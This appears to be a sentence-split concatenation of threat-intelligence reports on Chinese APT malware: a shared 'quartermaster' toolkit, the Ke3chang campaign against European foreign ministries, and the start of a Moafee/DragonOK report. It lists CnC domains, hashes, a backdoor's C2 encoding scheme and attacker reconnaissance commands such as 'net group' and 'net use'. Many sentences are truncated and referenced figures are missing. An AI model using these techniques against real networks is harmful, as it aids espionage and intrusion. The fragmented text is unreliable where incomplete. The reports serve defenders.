The similarity between these two manifests would likely go unnoticed by automated analysis .
Also , the XML is improperly formatted , hinting that it was formatted manually .
As an experiment , we used NSIS v2.34 to create our own simple installer and found that the XML in the manifest had no new - line or tab characters .
We utilized a simple technique to identify similarities in import tables between the 110 different samples we analyzed during our analysis .
We aggregated the import calls found in each sample and used this as a unique fingerprint .
We then used these fingerprints to cluster similar samples together .
The Python code in Figure 6 relies on the module pefile and can be used to dump all the import calls used in a specific binary .
The output can then be easily hashed .
We found 33 unique import tables used for the 110 different samples we collected during our research .
The most common import table seen had a MD5 hash of 3a7faeac22e6ab5c3c28a2b617901b51 and appeared in 38 different binaries .
This particular import table appeared in both Trojan . APT.9002 and Trojan .
It was used in eight of the 11 different clusters of activity we studied during this analysis .
In addition to the identical import tables , these samples have the same code base , differing in the unpacking routine for the actual payload , indicating that they are general - purpose launchers .
Upon execution , the malware samples with the import table hash of 3a7faeac22e6ab5c3c28a2b617901b51 called back to these domains and IP addresses : • ieee.boeing-job [ .
These 12 samples were all detected as Trojan . APT.PoisonIvy and appeared in only one of the 10 campaigns discussed below .
Upon execution , all of the malware samples with this import table hash beaconed to these domains : • luckmegame.servegame [ .
These samples were all detected as Trojan . APT.9002 and appeared in three of the 10 campaigns we analyzed .
Upon execution , these samples called back to these domains : • engage.intelfox [ .
Attackers often use stolen or spoofed digital certificates to sign their malicious code and improve the likelihood that their code will execute successfully on its target .
During our research , we found six digital certificates used to sign 44 different malware samples .
These certificates are currently revoked or expired and were signed by Microsoft , Sinacom , Facesun.cn , Mgame Corp , Guangzhou YuanLuo Technology Co. , Ltd. , and Wuhan Tian Chen Information Technology Co. , Ltd .
The full details of these certificates are available in Appendix A .
According to Kaspersky , the Mgame Corp. and Guangzhou YuanLuo Technology Co. , Ltd. certificates were stolen .
Whether the remaining certificates were also stolen - or were ever valid - is unclear .
The certificates from Mgame Corp and Wuhan Tian Chen Information Technology Co. , Ltd. were used most frequently .
We found 24 samples signed with the certificate from Mgame Corp .
These samples were all detected as Trojan . APT.9002 and appeared in four of the 10 campaigns we studied during this research .
We found 15 samples signed with the certificate from Wuhan Tian Chen Information Technology Co. , Ltd .
These samples were all detected as Trojan . APT.PoisonIvy and appeared in one of the 10 campaigns discussed below .
Although the compilation time of binaries can be easily forged , analyzing them is still useful .
The timestamp may not reveal when a binary was actually compiled , but it can be used to cluster samples by identical compile times .
The most common compile time was December 19 , 2012 at 20:25 .
We found 28 binaries compiled at this time .
All of these binaries were detected as Trojan . APT.9002 and utilized the Sunshop PE resource .
We observed samples with this timestamp in six of the 11 clusters of APT activity we studied during this research .
The next most common compile time was July 21 , 2012 at 14:50 .
We identified five samples compiled at this time .
All of these samples were detected as Trojan . APT.9002 and utilized the DTL PE resource .
These samples appeared in two of the 11 campaigns .
The use of this same compile times across a number of different campaigns is another indication that a common development and logistics infrastructure supported these disparate operations .
The shared characteristics were used across malware tools used in at least 11 different clusters of APT activity .
These clusters were originally believed to be separate and distinct campaigns and were grouped together based on shared CnC infrastructure using passive DNS data or registration information .
The Sunshop campaign appears to primarily leverage strategic Web compromise as a vector of attack .
We have detailed the specifics of the Sunshop campaign on the FireEye blog .
We found 15 different samples linked to the Sunshop campaign .
These samples were detected as Trojan . APT.Gh0st , Trojan .
All of the Sunshop samples that we identified had compile times between January 1 , 2013 and August 24 , 2013 .
Twelve of the 15 utilized the Sunshop PE resource , and none was signed with any of the six identified digital certificates .
When executed , the Sunshop samples beaconed to these CnC servers : • appupdate.myvnc [ .
The DTL campaign appears to depend primarily on spear - phishing email as an initial infection vector .
We found seven different samples linked to the DTL campaign .
All of these samples were detected as Trojan . APT.9002 .
These samples were compiled between September 19 , 2012 and July 30 , 2013 .
All of these samples were packaged with the DTL PE resource , and one of the samples was signed with the digital certificate from Mgame Corp .
When executed , the DTL samples called back to these CnC servers : • dtl.eatuo [ .
We found 26 different samples linked to the Ru.pad62 campaign .
These samples were detected as Trojan . APT.9002 , Trojan . APT.Gh0st , Trojan . APT.Kaba , and Trojan . APT.PoisonIvy .
The 26 linked samples had compile timestamps between September 19 , 2011 and December 19 , 2012 .
Ten of the samples from the Ru.pad62 campaign were packaged with the DTL resource , and six of the samples were packaged with the Sunshop resource .
Only four samples linked to the Ru.pad62 campaign were signed with digital certificates - two with the Mgame Corp. certificate and two with a certificate from Microsoft .
When executed , the Ru.pad62 samples we found called back to these CnC servers : • ru.pad62 [ .
We found five different samples linked to the Downmicrisoft campaign .
These samples were detected as Trojan . APT.9002 and Trojan . APT.Gh0st .
The five samples had compile timestamps between December 19 , 2012 and April 4 , 2013 .
The earliest compile time for samples from the Downmicrisoft campaign ( December 19 , 2012 ) was the same day as the latest compile time for samples from the Ru . Pad62 campaign .
Three of the samples linked to the Downmicrisoft campaign were packaged with the Sunshop PE resource , and all but one sample was signed with the Mgame Corp. digital certificate .
When executed , the Downmicrisoft samples called back to these CnC servers : • wv.downmicrisoft [ .
Also , the Trojan . APT.Gh0st sample linked to the Downmicrisoft campaign , c27730971c04cdf049b44912a50b4804 , did not use the default `` Gh0st '' string .
Instead , this sample used the string `` HTTPS '' .
The Boeing - Job campaign appears to utilize strategic Web compromises as an initial infection vector .
We previously discussed the Boeing - Job campaign 's use of the `` Lady Boyle '' Flash exploit on the FireEye blog .
We identified 19 different samples linked to the Boeing - Job campaign .
These samples were all detected as Trojan . APT.9002 and had compile timestamps between July 21 , 2012 and April 3 , 2013 .
Seven of the samples from the Boeing - Job campaign were packaged with both the Sunshop PE resource , and all but two were signed with the Mgame Corp. digital certificate .
When executed , the Boeing - Job samples called back to these CnC servers : • www.boeing-job [ .
We identified seven different samples linked to the Google - blogspot campaign .
These samples were all detected as Trojan . APT.Gh0st or Trojan . APT.PoisonIvy .
The Google - blogspot samples had compile timestamps between September 16 , 2008 and June 27 , 2012 .
Four of the samples from the Google - blogspot campaign were packaged with the Sunshop PE resource , and one sample was signed with a digital certificate from Facesun.cn .
When executed , the Google - blogspot samples called back to these CnC servers : • soft.google-blogspot [ .
We identified 18 different samples linked to the Luckme campaign .
These samples were all detected as Trojan .
Four of the samples from the Luckme campaign were packaged with the Sunshop PE resource .
Fifteen of the Luckme samples were signed with the digital certificate from Wuhan Tian Chen Information Technology Co. , Ltd .
When executed , Luckme samples called back to these CnC servers : • luckmegame.servegame [ .
We identified four different samples linked to the Piping campaign .
These samples were detected as Trojan . APT.PoisonIvy and Trojan . APT.9002 .
The Piping linked samples had compile timestamps between December 19 , 2012 and January 2 , 2013 .
All of the samples from this campaign were packaged with the Sunshop PE resource , and none was signed with a digital certificate .
When executed , the Piping samples called back to these CnC servers : The campaign targeted these industries : The Update1 campaign appears to utilize strategic Web compromise as an initial infection vector .
We identified five different samples linked to the Update1 campaign .
All of these samples were detected as Trojan . APT.9002 and had compile timestamps between July 30 , 2012 and December 19 , 2012 .
One of the Update1 samples was packaged with the Sunshop PE resource and one was packaged with the DTL PE resource .
None of the samples was signed with a digital certificate .
When executed , the Update1 samples called back to these CnC servers : The campaign targeted these industries : • High - tech • Entertainment / Media / Hospitality • Applied research and development • Services / Consulting / VAR The Packets campaign appears to utilize spear - phishing email as an initial infection vector .
We identified one Trojan . APT.9002 sample linked to the Packets campaign .
This sample had a compile time of December 19 , 2012 and was packaged with the Sunshop PE resource .
The sample was not signed with a digital certificate .
It called back to this CnC server : mlog.ddns [ .
We identified one Trojan . APT.9002 sample linked to the Allshell campaign .
This sample had a compile time of October 16 , 2012 and was packaged with the DTL PE resource .
The sample was not signed with a digital certificate .
It called back to this CnC server : • stmp.allshell [ .
Builders are tools used by malicious actors to quickly and easily create different variants of the same malware .
In a typical scenario , a skilled developer creates a builder and shares it with an operator more skilled in intrusion operations than in code development .
This separation of tasks is more efficient and supports a faster tempo of offensive operations .
A typical builder provides a graphical user interface that enables a threat actor to configure elements such as the location of the CnC server .
To recap , these shared characteristics , as discussed in previous sections , include the following : • The Sunshop and DTL PE resources • Common import tables • Six different digital certificates • Common compile times • Common malware families Figure 9 : Typical Builder life cycle We identified a builder tool used to create Trojan . APT.9002 binaries , which we are dubbing `` 9002 Builder .
As shown in Figure 10 , the dialogue and menu options in this GUI are in Chinese .
The builder enables threat actors to configure the following : • Both a primary and a secondary CnC server .
The default ID produced by this builder is `` 1 .
The default health check domain configured in this builder was `` update.microsoft.com '' .
An Internet health check domain is typically used by malware to determine whether a target 's endpoint is connected to the Internet before acting .
Also , the text in the title bar of this builder is '' [ User_Server_Builder ] update 2012 - 7 - 21 '' .
Although the servers produced by this builder have a compile time of 10/23/12 8:30 UTC , we believe the date in the title bar of the builder is significant ; we identified five different binaries with a compile time of 7/21/12 .
All five utilized the same DTL resource found in 9002 Builder .
The 9002 Builder appears to be a modified variant of the builder used to create the samples listed in Table 12 .
The compile time of the builder is 10/23/2012 11:18 UTC , a little less than 3 hours after the compile time of the server that is produced by it .
We believe it is a common practice for the developer to compile a new server , update the builder code accordingly , then compile the new builder .
The older date in the title bar may just be an oversight as i t would have to be manually updated by the developer .
The builder contains a copy of the server executable in its PE resource section , under BIN .
The server executable is responsible for installing the 9002 payload malware , and has its configuration block stored in its .data
The configuration block uses simple , single - byte XOR encryption .
The key varies from version to version ; in some cases , it skips null bytes .
During the installation routine , the configuration block is written to the registry value sysinfo under the registry key HKCU\Software\Classes .
When the threat actor builds a malware executable , the builder writes the server executable to disk and overwrites the configuration block with the newly configured options .
The location of the configuration block within the .data
We noticed that the configuration block is indeed stored at a different offset in the samples compiled on 7/21/12 as compared to the sample created by the builder we have with the compile date of 10/23/12 .
This further supports our belief in the practice of the developer compiling the server and then shortly after compiling the builder .
He would need time to locate the new offset of the configuration block in the newly compiled server executable and then change the hard - coded value in the builder code .
Attackers using 9002 Builder seem to have gradually adopted another launcher that stores the configuration block as a resource instead of storing it in its .data
Based on the compile - time analysis outlined in the `` Compile Times '' section of this report , the shift began in late October of 2012 ( with a few exceptions ) .
This shift makes sense for the builder 's developer ( s ) ; they no longer needed to update the builder for every code change in the launcher or 9002 payload malware .
This launcher , mentioned earlier in this paper as having the import table hash 3a7faeac22e6ab5c3c28a2b617901b51 , supports different payloads , such as Poison Ivy and 9002 .
Based on the evidence provided , we draw the following possible conclusions : [ High Confidence ] SDQ exists and supports separate APT campaigns .
We believe the most likely explanation for these documented correlations is that a shared ' development and logistics ' operation ( SDQ ) supports a number of different APT campaigns , as part of formal offensive apparatus .
That said , it is conceivable that the 11 clusters of activity , previously believed to be independent campaigns run by different actors , are in fact one cluster of activity run by one well - resourced actor .
However , we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords , campaign identifiers , and mutexes .
These artifacts were generally consistent within each cluster of activity but differed across clusters .
Alternatively , different actors might be responsible for the documented 11 clusters of activity and instead of relying on a centralized development and logistics operation , these actors share TTPs through formal or informal channels .
In each of these scenarios , a shared development and logistics infrastructure or some notion of a digital quartermaster clearly underpins all of the activity presented in this report .
Whether this quartermaster involves informal connections between developers or a structured bureaucratic organization serving a central offensive apparatus is unclear .
Regardless of the scenario , the overall finding of a shared development and logistics infrastructure suggests targeted organizations are facing a more organized menace than they realize .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including mobile , Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
Diplomatic missions , including ministries of foreign affairs ( MFA ) , are high - priority targets for today 's cyber spies .
Large - scale cyber espionage campaigns such as `` GhostNet '' have demonstrated that government agencies around the world , including embassies , are vulnerable to targeted cyber attacks .
As the crisis in Syria escalates , FireEye researchers have discovered a cyber espionage campaign , which we call `` Ke3chang , '' that falsely advertises information updates about the ongoing crisis to compromise MFA networks in Europe .
We believe that the Ke3chang attackers are operating out of China and have been active since at least 2010 .
However , we believe specific Syria - themed attacks against MFAs ( codenamed by Ke3chang as `` moviestar '' ) began only in August 2013 .
The timing of the attacks precedes a G20 meeting held in Russia that focused on the crisis in Syria .
During this time , we discovered 21 compromised machines connecting to the CnC server .
These included what appear to be three administrative tests by the attackers and two connections from other malware researchers .
Among the targets , we identified nine compromises at government ministries in five different European countries .
Eight of these compromises were at MFAs .
When FireEye had visibility on the CnC server , we saw the attackers engage in post - compromise information gathering and lateral movement on the target network , where upon FireEye immediately contacted the relevant authorities and began the notification process .
Alas , poor James Bond .
The days are over when spies had to be both a black belt and Prince Charming in the same scene .
Today , the vast majority of intelligence collection is conducted through signals intelligence .
The ubiquity and vulnerability of the Internet have opened windows into the affairs of Washington , Beijing , and Moscow to a degree that Bond author , Ian Fleming , would never have imagined .
The worldwide deployment of espionage - focused malware has made this generation the Golden Age of espionage .
Global reach , stealthy maneuvers , legal cover , and plausible deniability - what more could a spy ask for ? That is why FireEye focuses on the vexing problem of the advanced persistent threat ( APT ) .
Each attack comprises a variety of phases , including reconnaissance , exploitation , command and control , lateral movement , and exfiltration .
Intelligence can be extracted during each phase of the attack to build a full understanding of the tools , techniques , and procedures ( TTPs ) used by a particular APT campaign 's life cycle .
However , network defenders may have only partial visibility into any single incident .
That makes tracking and correlating activity across multiple related incidents critical .
The Ke3chang attackers have been active since at least 2010 .
Tracking their activity over time has revealed information on their targeting preferences and the malware tools they use .
The attackers have used three types of malware over the years and have traditionally targeted the aerospace , energy , government , high - tech , consulting services , and chemicals / manufacturing / mining sectors .
However , the number of attacks against entities in these sectors has been small .
The scarcity of individual attacks may indicate the attackers are selective about their targets .
During August 2013 , FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang attackers .
In addition to confirming compromised endpoints at several MFAs , FireEye gained unique insight into the attackers ' lateral movement activities .
In this report , we present the historical intelligence we have gathered on the Ke3chang campaign , as well as an in - depth assessment of the ongoing Syrian - themed attacks against these MFAs .
Our objective is to arm network defenders with information to combat this threat actor .
Traditionally , the Ke3chang attackers have used spear - phishing emails with either a malware attachment or a link to a malicious download .
They have also leveraged a Java zero - day vulnerability ( CVE-2012 - 4681 ) , as well as older , reliable exploits for Microsoft Word ( CVE-2010 - 3333 ) and Adobe PDF Reader ( CVE-2010 - 2883 ) .
The Ke3chang attackers have also sent Windows screensaver files ( .scr
In addition to the recent Syria - themed campaign , they also used a London Olympics - themed campaign in 2012 and one that involved former model and French first lady Carla Bruni in 2011 .
Over the years , the Ke3chang attackers have used three types of malware that we call : `` BS2005 '' , '' BMW '' , and `` MyWeb '' .
We believe these three types of malware are an evolution of a single project from a single developer or small team of developers sharing code .
Functionally , it is a typical first stage backdoor commonly found in APT attacks .
It has the ability to upload and download files , run shell commands , and sleep for a configurable length of time .
All of the CnC communications are performed over the HTTP protocol .
The current Ke3chang campaign leverages the BS2005 malware , while older activity from 2010 - 2011 leveraged BMW , followed by the MyWeb malware sporadically used in between .
Just as the media began to report on possible U.S. military intervention in Syria , the Ke3chang attackers began to use this topic as a lure to trick their targets into running their malware .
Although attackers routinely employ breaking news as lures , the targets of this campaign , codenamed by Ke3chang as '' moviestar '' , were various ministries of foreign affairs in Europe .
The malware used in this most recent campaign is known as `` BS2005 '' .
One sample was located in a ZIP file named `` US_military_options_in_Syria.zip '' ( 6cb633b371700d1bd6fde49ab38ca471 ) and contained the file `` US_military_options_in_Syria.pdf.exe '' ( b68a16cef982e6451ddf26568c60833d ) .
This executable is a `` loader '' that contains the process debugging ( PDB ) string : Upon execution , the loader drops another executable `` ie.exe '' ( 277487587ae9c11d7f4bd5336275a906 ) that contains the following PDB string : This executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of the backdoor .
Upon execution of `` ie.exe '' , it beacons to a CnC host , named cascais.epac.to ( IP : 122.10.83.51 ) , with the following HTTP traffic pattern : Although this sample uses the `` /p3oahin/ '' path , we have observed earlier samples that used the path `` /ke3chang/ '' and `` /shfam9y/ .
In this case , the mark in the Syria - themed iteration of this campaign was consistently the `` moviestar '' tag .
Each byte of the CnC data goes through the following transformation : • The data has 0x27 plus its positional index number added to it • It is then XOR 'd with its positional index number • This data is then Base64 encoded , with ' + ' characters being replaced with ' * ' characters when the data is transmitted as a parameter in the URL The Base64 data for the ' r ' parameter decodes and decrypts to the following data format : < Local IP address > < Computer name > < Domain > < Campaign marker > < Date / Time > < Command identifier > < Volume serial number > < yes / no / nn > < empty line > < empty line > In this format , the < yes / no / nn > indicates whether more data is available for command output or file upload .
An `` nn '' refers to NOP / NOOP ( `` NO OPeration '' -a beacon signal ) .
Various versions of the BS2005 malware will use a different constant for the addition part of the encryption routine and contain other information , such as the following : • Installed mail client • Internet Explorer version • Windows version • Whether a proxy server is configured • Whether a virtual machine was detected In addition to the Base64 data in the URI of the HTTP POST , the BS2005 malware also includes Base64 data in the body of the HTTP POST .
The Base64 data for the POST body decodes and decrypts to one of the following : `` no , '' uploaded file content , or the output from the previous command .
Once the HTTP POST completes , the response is an HTML page with a hidden form ( see Figure 3 ) .
A particular string sequence is expected , which contains a command ID and delimited parameters .
All three malware families that FireEye analyzed ( BS2005 , MyWeb , and BMW ) follow a similar CnC pattern in their HTTP replies .
At least one of the BS2005 samples contained a simple anti - virtual machine heuristic .
Specifically , the GetTickCount function is called and a loop is executed 999,999,990 times that simply increments a variable .
After this loop completes , GetTickCount is called again and the values are compared .
If they are the same , the process terminates .
A trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM interface to perform their CnC communication .
This programming interface allows the programmer to reuse code from an existing browser ( typically Internet Explorer ) to perform Web browsing , simplifying the development process .
The network communication is actually performed through the browser process , causing some misdirection when it comes to determining which process is ultimately responsible for generating this network traffic .
This technique is nothing new for malware , but FireEye did notice something interesting in BS2005 's behavior .
But why the malware would be programmed to terminate Maxthon , a free browser developed by a Chinese company , was initially unclear .
Upon further investigation , we found that if a Maxthon browser is open while the BS2005 malware uses this IWebBrowser2 COM interface to navigate to a Web page , the Maxthon browser opens a new tab and visibly navigates to the Web page itself .
Instead of using other APIs to make Web requests and read responses , the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser processes running on the target computer .
This lack of sophistication is present throughout the code in all three malware families ( BS2005 , MyWeb , and BMW ) .
Improvements in the BS2005 version of the malware include a `` sleep until date / time '' command and weak encryption for all CnC data ; previous iterations ( MyWeb and BMW ) did not encrypt the host information sent in the beacon .
In 2011 a campaign , labeled `` snake '' by the attackers , started using the theme of nude photos of the French prime minister 's wife , Carla Bruni , as a lure .
Attackers sent an email to various targets that encouraged recipients to download a password - protected RAR file ( see Figure 5 ) .
The malware contained within the RAR was named `` carla_bruni_nude_pics_spp.scr '' ( 727ef86947f5e109435298e077296a42 ) .
When executed , the BS2005 malware connected to a CnC server with the following HTTP traffic pattern : The CnC server 's hostname in this case contains the string `` g20news '' ; because of this , FireEye believes that the targets of the `` snake '' campaign may have been related to the G20 finance ministers meeting held in Paris , France on October 15 , 2011 .
In 2012 , another series of attacks began that leveraged information about the London Olympics in an attempt to lure targets into clicking on malicious attachments ( see Figure 6 and Figure 7 ) .
Based on information from the FireEye® Dynamic Threat Intelligence™ ( DTI ) cloud , we observed that this campaign targeted a single firm in the Chemicals / Manufacturing / Mining sector .
These attacks leveraged older exploits in Adobe PDF Reader ( CVE-2010 - 2883 ) and Microsoft Word ( CVE-2010 - 3333 ) .
These BS2005-laced samples ( ecc1167a5f45d72c899303f9bbe44bbc and b391d47b37841741a1817221b946854a ) connected to the following CnC servers : • news.studenttrail.com • skyline.ns1.name The HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path of `` /ke3chang/ '' to `` /shfam9y/ '' .
This could represent an attempt to avoid any network - based signatures that detect based on the specific URL path of earlier samples .
Lastly , the addition constant for the CnC encryption routine in these two BS2005 samples is 0x7C .
Three months after the Olympics - themed attacks , FireEye observed a new BS2005 campaign labeled `` newtiger , '' which is possibly a reference to an older 2010 campaign labeled `` tiger .
Using information from the FireEye DTI cloud , FireEye observed that this campaign targeted a single firm in the Services / Consulting sector .
The sample used in this attack ( 50dd931b85891168244a10073f4a6f79 ) dropped BS2005 malware that connected to the CnC www.trap.dsmtp.com and used the `` /shfam9y/ '' URI path .
The Ke3chang attackers used the older `` MyWeb '' malware family from 2010 to 2011 .
The MyWeb sample that FireEye analyzed has a compile date of 1/20/2011 .
At least one of the attacks in this campaign leveraged a European security and defense - themed lure , which aligns with the targeting preferences for this group .
Improvements over BMW include an anti - sandbox detection technique , a configurable sleep value for the CnC beacon loop , and a consolidated configuration block that enables the malware author to change the CnC domain without having to recompile the malware .
If the values are equal , the malware process terminates silently .
The MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the portable executable ( PE ) file .
To decode the configuration data , each character has its positional index number added to it .
The CnC domain is stored at offset 0x0 .
Upon successful connection to the CnC server , the malware sleeps for the amount of time that is stored in seconds at offset 0x20 .
The sleep value used for CnC connection failures is stored in minutes at offset 0x30 .
The addition constant for the encryption routine for the sample we analyzed ( be58180f4f7ee6a643ab1469a40ffbca ) is 0x5A .
The beacon data is transmitted in URL parameters in plaintext and is self - explanatory : Downloaded and uploaded files are simply Base64 encoded .
Command results are encrypted and then Base64 encoded .
The initial infection vector is unknown ; however , BMW was presumed to be delivered via weaponized email attachments / links - similar to the newer campaigns leveraging MyWeb and BS2005 .
The samples we analyzed have a compile date of 2010/07/08 .
This malware is known as BMW , due to the presence of this PDB string : BMW sample ( 649691e1d367721f0ff899fd31133915 ) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic : The < filename > in the URI is randomly chosen from one of the following hard - coded entries within the malware binary : • acheb.aspx • bajree.aspx • cyacrin.aspx • dauber.aspx • eaves.aspx The Base64 encoded data in the POST body decodes to the following : The < Y / N > data indicates whether the malware is running inside a virtual machine .
The < X Bytes > data indicates the number of bytes last downloaded from the download file command .
The constant used for addition in the sample we analyzed is 0x5A .
Malware Family Matrix Table 1 is a complete list of all samples that were analyzed as part of this investigation , along with any known URI variances , campaign markers , and decoy or lure themes used by this threat actor .
The Ke3chang attackers ' CnC infrastructure relies primarily on domains obtained from dynamic DNS providers .
The attackers shift IP addresses frequently and often point their CnC domains to legitimate IP addresses when they are not in use .
To date , we have observed the following domains used by each of these malware families : BS2005 • g20news.ns01.us • news.studenttrail.com • skyline.ns1.name • www.trap.dsmtp.com • ftp.backofficepower.com • news.freewww.info • blackberry.dsmtp.com • adele.zyns.com • windowsupdate.serveuser.com • officescan.securitynh.com • yahoo.concursv.com • cascais.epac.to • www.errorreporting.sendsmtp.com • www.sumba.freetcp.com • google.winfy.info • cname.yahoo.sendsmtp.com BMW • mail.yahoo.sendsmtp.com • update.msntoole.com MyWeb • expo2010.zyns.com • win7.sixth.biz • ensun.dyndns.org • www.spaces.ddns.us • blog.strancorproduct.info We have mapped out the relationship between the CnC servers for all three malware families and have found that they have shared common historical IP addresses in the past .
Using the IP addresses from the 23 CnC servers FireEye collected from our initial samples , we then mapped all the IP addresses that these domains resolved to .
We then collected any other domains that also resolved to these IP addresses , resulting in at least 99 possible Ke3chang CnC servers .
Upon further analysis , we find that these 99 CnC servers are primarily located in the U.S. , China , and Hong Kong .
Upon accessing one of the Ke3chang CnC servers , we found that the attackers have a Web - based control panel that allows them to interact with compromised computers , as shown in Figure 14 .
The control panel also contains a link to an `` AutoScanner '' feature that includes several preconfigured commands to gather information about a compromised system and perform network reconnaissance on the endpoint ( see Figure 15 ) .
Once a compromised system connects to the CnC server , the Ke3chang attackers follow a predetermined script .
They first gather information about the local computer and the network to which it is connected .
This step was done manually ; we found several instances of typing errors , such as the following : • net group `` [ REDACTED ] '' /doamin • net group /doamin The attackers then listed information for specific users , focusing on users and groups suspected of possessing advanced rights such as domain administrators and service accounts that have access to a wide range of systems .
Then they used the `` net use '' command to map network drives , including some that required a password , as follows : • net use \\ [ REDACTED ] [ REDACTED ] : J : /user : [ REDACTED ] In some cases , they appeared to try and move laterally by copying a file ( always initially called '' msn.tmp '' ) to other machines on the network .
They frequently changed the destination directory and filename of the target file , presumably to make finding the malware more difficult for incident responders upon initial discovery .
However , FireEye lost visibility on this Ke3chang CnC server before the attackers shifted to the major data exfiltration phase .
Determining attribution requires more than just malware analysis .
It requires an understanding of the attackers activities across the attack life cycle ( or `` kill chain '' ) , along with an assessment of contextual indicators , such as the targeting , timing , and scope of the attacks .
Unfortunately , this level of visibility is not always available , which often leaves significant gaps in analysis .
Therefore , exploring competing hypotheses is important , as is recognizing , and acknowledging areas of uncertainty .
Moreover , `` attribution '' can have multiple meanings .
Some use it to refer to an ultimate beneficiary , such as a nation - state , while others use the term to refer to malware authors or CnC operators .
During our investigation , FireEye focused on technical clues left by the malware authors and CnC operators .
Within the malware binaries themselves , linguistic clues point to the malware authors ' use of the Chinese language , as seen in Figure 17 .
In addition , the Ke3chang CnC control panel contains a mix of Chinese and English words and characters .
The subset of CnC servers that were not hosted by dynamic DNS infrastructure was registered using a registrar in China ( XIN NET ) and the WHOIS records indicate that the registrant is in China .
The following email addresses were used to register those non - dynamic CnC domains : • xiaoxiao_222 @ yahoo.com • tk329 @ yahoo.com • zsy @ gmail.com During our period of visibility into the BS2005 `` moviestar '' campaign against various ministries of foreign affairs in Europe , FireEye discovered that the attackers had initially tested the malware in virtual machines , prior to compromising actual targets .
We retrieved the output of the commands the attackers had run when testing the malware .
The output indicates that the Ke3chang attackers are testing their malware in Windows operating systems , with the default language set to Chinese .
Based on this circumstantial evidence we believe that the Ke3chang attackers are operating within China .
But their exact identities and motivation remain unknown .
Ministries of foreign affairs in Europe have been targeted and compromised by a threat actor we call Ke3chang .
This attack used the crisis in Syria as a lure to deliver malware to its targets .
The timing of the attack precedes the G20 meeting in Russia that focused on the crisis in Syria .
Furthermore , FireEye has presented evidence indicating that the Ke3chang attackers have been active since at least 2010 and have attacked targets related to G20 meetings in the past .
During our investigation , we were able to observe the inner workings of one of the CnC servers used by the attackers .
As a result , we were able to identify some of the victims of the attack , as well as gather circumstantial evidence that indicates that the attackers may be operating from China .
During our brief window of visibility into one of the known 22 CnC nodes , FireEye observed the attackers conducting reconnaissance and moving laterally throughout the compromised networks .
Relevant authorities were immediately notified upon this discovery , and FireEye began its worldwide target notification process .
At that time , FireEye did not observe the attackers exfiltrating sensitive data ; however , we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data shortly thereafter .
Accordingly , diplomatic missions , including ministries of foreign affairs , continue to be targeted by malware - based espionage campaigns .
This report demonstrates that attackers are able to successfully penetrate government targets using exploits for vulnerabilities that have already been patched and despite the fact that these ministries have defenses in place .
This illustrates the limitations of traditional defenses and highlights the need for security strategies that not only leverage advanced technologies designed to defend against targeted threats , but also the incorporation of threat intelligence and an incident response capability .
To learn more about FireEye , visit www . FireEye.com .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors , including mobile , Web , email , and files and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
In the realm of quantum mechanics , entanglement is a peculiar phenomenon in which a pair of particles takes on the properties of each other , regardless of the distance between them .
Albert Einstein best described this intertwining phenomenon as `` spooky action at a distance '' .
This behavior is analogous to the observed correlation between the two geographically separated attack groups detailed in this paper .
We have uncovered two distinct attack campaigns originating from different geographic regions in China using similar tools , techniques and procedures ( TTPs ) .
In both campaigns , each attack group employed multiple overlapping TTPs to infiltrate their targets , including similar custom built backdoors and remote administration tools ( RATs ) such as CT / NewCT , Mongall and Nflog ( and publicly available RATs such as PoisonIvy ) to maintain access to victim networks .
We also observed the use of another custom backdoor called Sysget / HelloBridge by one of the attack groups , which we believe is possibly shared between the campaigns as well .
Both groups were also used a well - known proxy tool named HTRAN , which is an abbreviation for `` HUC Packet Transmit Tool '' .
This tool proxies connections through intermediate hops and aids the attackers in disguising their true geographical location when interacting with the victim networks .
We also observed both attack groups using similar techniques to evade detection by security products .
In sum , we believe that these groups are from two distinct regions in China and possibly ( 1 ) are collaborating , ( 2 ) received the same training , ( 3 ) have a common toolkit supply chain , or some combination of these three .
The relationship between the two attack groups may be direct or indirect , but based on our current visibility , they seem to have two distinct missions , with each one targeting different industries .
We were able to ascertain the geographical locations of the two attack groups by analyzing their `` HTRAN '' infrastructure over a period of time .
We believe a separate third group may also be employing these tools , but we do not have sufficient insight in to this additional group at this time .
The attack group `` Moafee '' ( named after their command and control infrastructure ) appears to operate out of the Guangdong province in China and is known to target the governments and military organizations of countries with national interests in the South China Sea .
The seas in this region have multiple claims of sovereignty and hold high significance , as it is the second busiest sea - lane in the world and are known to be rich in resources such as rare earth metals , crude oil , and natural gas .
We have also observed the Moafee group target organizations within the US defense industrial base .
The attack group `` DragonOK '' ( named after an event name in one of their payload executables ) appears to operate out of the Jiangsu province in China , and is known to target high - tech and manufacturing companies in Japan and Taiwan .
The propensity to target these industries possibly demonstrates an interest in gaining economic competitive advantage in the region through the acquisition of trade secrets .
The primary observed attack vector used by both groups is spear - phishing emails .
The themes -- or topics - used in the emails from the DragonOK group were well crafted and highly tailored to the target audience .
We also found this attack group using the appropriate language for each of their targets in the phishing emails– such as Japanese and traditional Chinese ( mainly used in Taiwan ) .
The attachments in the email were typically an executable file embedded in a ZIP archive or password - protected Microsoft Office documents .
One such email , shown in Figure 2 and used by the DragonOK group was written in traditional Chinese , and targeted a Taiwanese technology firm We observed both attack groups employ decoy documents in order to help deceive potential victims .
The decoy documents are presented to the victim while the malware runs in the background .
One such Japanese - language decoy documents used by the `` DragonOK '' group is shown below .
It appears to be a resume of someone from Kyoto University in Japan who was involved in English language studies .
Both attack groups employ numerous , yet common techniques in an attempt to evade detection by various sandbox environments , antivirus ( AV ) software , and gateway firewalls .
